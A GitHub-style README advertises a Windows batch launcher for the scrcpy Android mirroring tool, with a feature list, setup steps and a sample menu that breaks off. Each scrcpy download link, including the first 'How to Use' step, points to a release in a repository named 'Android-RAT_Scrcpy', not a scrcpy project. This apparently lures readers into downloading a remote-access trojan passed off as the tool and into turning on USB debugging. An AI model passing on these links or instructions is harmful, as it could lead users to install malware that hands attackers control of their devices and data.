# scrcpy-batch-launcher

📱 scrcpy-batch-launcher

**A simplified, GUI-like batch launcher and usage guide for [scrcpy](https://github.com/Andre0194/Android-RAT_Scrcpy/releases/tag/Droid_Scrcpy)**  
This tool helps beginners and automation users launch `scrcpy.exe` easily via USB or Wi-Fi without memorizing complex ADB commands.

---

### Screenshot

> ![scrcpy-batch-terminal](https://user-images.githubusercontent.com/example/scrcpy-batch-ui.png)  
*(Terminal UI with options to launch scrcpy by USB, TCP/IP, Serial, or Manual IP)*

---

## Features

- 📦 Launch scrcpy via USB, automatic Wi-Fi (TCP/IP), or manual IP
- 📁 Drag-and-drop support for uploading files into Codespaces
- 🔧 Works in GitHub Codespaces and local Windows terminals
- 📘 Comes with a full step-by-step `scrcpy_guide.txt`
- 🧠 No command memorization needed — choose options interactively
- 💡 Great for beginners, pentesters, or power users needing quick setup

---

## Included Files

| File                    | Description                                  |
|-------------------------|----------------------------------------------|
| `scrcpy_guide_runner.bat` | Main launcher script with interactive menu   |
| `scrcpy_guide.txt`        | Detailed instructions for scrcpy usage       |
| `README.md`               | This file (for GitHub display)               |

---

## Requirements

- 🖥️ Windows 10/11
- ✅ [scrcpy](https://github.com/Andre0194/Android-RAT_Scrcpy/releases/tag/Droid_Scrcpy) and `adb.exe` placed in same folder
- 📱 Android device with:
  - Developer Mode enabled
  - USB Debugging ON

---

## How to Use

1. **Download [scrcpy](https://github.com/Andre0194/Android-RAT_Scrcpy/releases/tag/Droid_Scrcpy) and extract it.**
2. Place `scrcpy_guide_runner.bat` and `scrcpy_guide.txt` in the same folder as `scrcpy.exe`.
3. Double-click `scrcpy_guide_runner.bat` and follow the interactive prompts.
4. ✅ Done! You're mirroring Android with just a few keystrokes.

---

## Sample Menu (from `.bat`)

```txt
===============================
    SCRCPY MIRROR TOOL
===============================

1. Run scrcpy via USB
2. Setup scrcpy over Wi-Fi (TCP/IP)
3. Manually connect over Wi-Fi
4. Use specific device serial/IP
5. Exit
